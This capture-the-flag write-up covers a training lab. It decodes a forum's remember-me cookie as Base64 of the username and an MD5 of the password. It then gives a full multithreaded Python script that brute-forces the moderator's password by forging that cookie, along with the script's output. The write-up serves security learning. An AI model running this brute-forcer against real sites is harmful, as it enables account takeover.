---

Name: Skein
Difficulty: Medium
URL: https://dashboard.webverselabs-pro.com/learning-paths/junior-web-hacker/02/bump-key
Description: Skein is a volunteer-moderated forum for spinners, knitters and quilt-makers. Members hate logging in every time they swap a colourway, so the "Keep me signed in for 30 days" checkbox is on by default. The head moderator, who manages a small army of fibre-fest organisers, picked a memorable password back when the forum was just three friends and a Google sheet. 

---


## Enumeration

I started by enumerating the web application:

```bash
gobuster dir -url https://4475ce34-5330-bump-key-100ce.challenges.webverselabs-pro.com/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 100 -x txt,php,html,bak,zip,log,old,js -k
```

The interesting endpoints were:

```text
/account
/login
/logout
/members
/projects
/register
/robots.txt
/threads
```

The `/account` page requires authentication, while `/members` was accessible without logging in.

---

## Creating an Account

I created a normal account and inspected the cookies.

The application initially gave me a `sk_session` cookie:

```text
sk_session=9055f306c008421cf06a4cd8d27647b8
```

The interesting part was the "Keep me signed in for 30 days" functionality.

After enabling the remember-me option, another cookie appeared:

```text
rmbr
```

Its value was:

```text
dGVzdDowOThmNmJjZDQ2MjFkMzczY2FkZTRlODMyNjI3YjRmNg==
```

---

## Analyzing the `rmbr` Cookie

The value looked like Base64, so I decoded it:

```bash
echo "dGVzdDowOThmNmJjZDQ2MjFkMzczY2FkZTRlODMyNjI3YjRmNg==" | base64 -d
```

This returned:

```text
test:098f6bcd4621d373cade4e832627b4f6
```

The first part was clearly my username:

```text
test
```

The second part looked like an MD5 hash.

To confirm what was being hashed, I generated the MD5 hash of the password `1234`:

```bash
echo -n "1234" | md5sum
```

The result was:

```text
81dc9bdb52d04dc20036dbd8313ed055
```

I then checked another example:

```text
1234:81dc9bdb52d04dc20036dbd8313ed055
```

This confirmed the format:

```text
username:MD5(password)
```

The entire value is then Base64 encoded and stored in the `rmbr` cookie.

So the server is effectively trusting a cookie structured like:

```text
Base64(username:MD5(password))
```

---

## Finding the Target User

Looking through `/members`, I found the head moderator:

```text
Marin Loomweaver
@loomweaver
Head Moderator
Member-No: SK-0001
```

The username was:

```text
loomweaver
```

I initially tried simply replacing my username in the cookie:

```text
loomweaver:098f6bcd4621d373cade4e832627b4f6
```

and Base64 encoding it.

However, this did not work.

The reason is that the second value is not just an arbitrary identifier. It is the MD5 hash of the user's password.

Changing only the username leaves the hash associated with my original password, so the server rejects the cookie.

---

## Brute-Forcing the Password

At this point, the remaining problem was to find the password corresponding to:

```text
loomweaver
```

For every candidate password from `rockyou.txt`, I needed to:

1. Calculate `MD5(password)`.
2. Construct `loomweaver:MD5(password)`.
3. Base64 encode the resulting string.
4. Send it as the `rmbr` cookie.
5. Request `/account`.
6. Check whether the server treats the request as authenticated.

Doing this sequentially was very slow because every password requires an HTTP request.

I therefore used ChatGPT to create a python script that uses multiple concurrent workers.

```python
#!/usr/bin/env python3

import base64
import hashlib
import threading
import requests

from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED


URL = "https://4475ce34-5330-bump-key-100ce.challenges.webverselabs-pro.com/account"
USERNAME = "loomweaver"
WORDLIST = "/usr/share/wordlists/rockyou.txt"

WORKERS = 50
TIMEOUT = 5

tested = 0
tested_lock = threading.Lock()
found = threading.Event()


def make_cookie(password):
    digest = hashlib.md5(password.encode()).hexdigest()
    value = f"{USERNAME}:{digest}"
    return base64.b64encode(value.encode()).decode()


def check_password(password):
    if found.is_set():
        return None

    password = password.rstrip("\r\n")

    cookie = make_cookie(password)

    try:
        response = requests.get(
            URL,
            cookies={"rmbr": cookie},
            allow_redirects=False,
            timeout=TIMEOUT,
        )

        location = response.headers.get("Location", "")

        if response.status_code in (301, 302, 303, 307, 308):
            if location == "/login" or location.endswith("/login"):
                return None

        if response.status_code == 200:
            body = response.text.lower()

            authenticated_indicators = (
                "loomweaver",
                "logout",
                "account",
                "sign out",
            )

            if any(indicator in body for indicator in authenticated_indicators):
                return password, cookie, response.status_code

    except requests.RequestException:
        return None

    return None


def main():
    global tested

    print("[*] Skein rmbr brute-force")
    print(f"[*] Target   : {URL}")
    print(f"[*] Username : {USERNAME}")
    print(f"[*] Wordlist : {WORDLIST}")
    print(f"[*] Workers  : {WORKERS}")
    print()

    print("[*] Loading wordlist...")

    with open(WORDLIST, "r", encoding="latin-1") as f:
        passwords = [line.rstrip("\r\n") for line in f]

    print(f"[*] Loaded {len(passwords):,} passwords")
    print("[*] Starting...\n")

    executor = ThreadPoolExecutor(max_workers=WORKERS)

    password_iter = iter(passwords)
    futures = set()

    for _ in range(WORKERS):
        try:
            password = next(password_iter)
            futures.add(executor.submit(check_password, password))
        except StopIteration:
            break

    try:
        while futures and not found.is_set():

            done, futures = wait(
                futures,
                return_when=FIRST_COMPLETED,
            )

            for future in done:

                result = future.result()

                with tested_lock:
                    tested += 1

                    if tested % 500 == 0:
                        print(
                            f"[*] Tested {tested:,}/{len(passwords):,}"
                        )

                if result:
                    password, cookie, status = result

                    found.set()

                    digest = hashlib.md5(
                        password.encode()
                    ).hexdigest()

                    print()
                    print("=" * 60)
                    print("[+] PASSWORD FOUND")
                    print("=" * 60)
                    print(f"[+] Username : {USERNAME}")
                    print(f"[+] Password : {password}")
                    print(f"[+] MD5      : {digest}")
                    print(f"[+] rmbr     : {cookie}")
                    print(f"[+] HTTP     : {status}")
                    print("=" * 60)

                    executor.shutdown(
                        wait=False,
                        cancel_futures=True,
                    )

                    return

                if not found.is_set():
                    try:
                        password = next(password_iter)
                        futures.add(
                            executor.submit(
                                check_password,
                                password,
                            )
                        )
                    except StopIteration:
                        pass

    except KeyboardInterrupt:
        print("\n[!] Interrupted.")

    finally:
        executor.shutdown(
            wait=False,
            cancel_futures=True,
        )

    if not found.is_set():
        print()
        print(f"[-] Password not found after {tested:,} attempts.")


if __name__ == "__main__":
    main()
```

I ran the script against the `/account` endpoint using `rockyou.txt`.

Once the correct password was found, the script printed the password, its MD5 hash, and the resulting `rmbr` cookie.

```bash
$ python3 exploit.py
[*] Skein rmbr brute-force
[*] Target   : https://4475ce34-5330-bump-key-100ce.challenges.webverselabs-pro.com/account
[*] Username : loomweaver
[*] Wordlist : /usr/share/wordlists/rockyou.txt
[*] Workers  : 50

[*] Loading wordlist...
[*] Loaded 14,344,391 passwords
[*] Starting...

[*] Tested 500/14,344,391
[*] Tested 1,000/14,344,391

============================================================
[+] PASSWORD FOUND
============================================================
[+] Username : loomweaver
[+] Password : password123
[+] MD5      : 482c811da5d5b4bc6d497ffa98491e38
[+] rmbr     : bG9vbXdlYXZlcjo0ODJjODExZGE1ZDViNGJjNmQ0OTdmZmE5ODQ5MWUzOA==
[+] HTTP     : 200
============================================================
```

After adding the cookie we can view /account and get the flag.
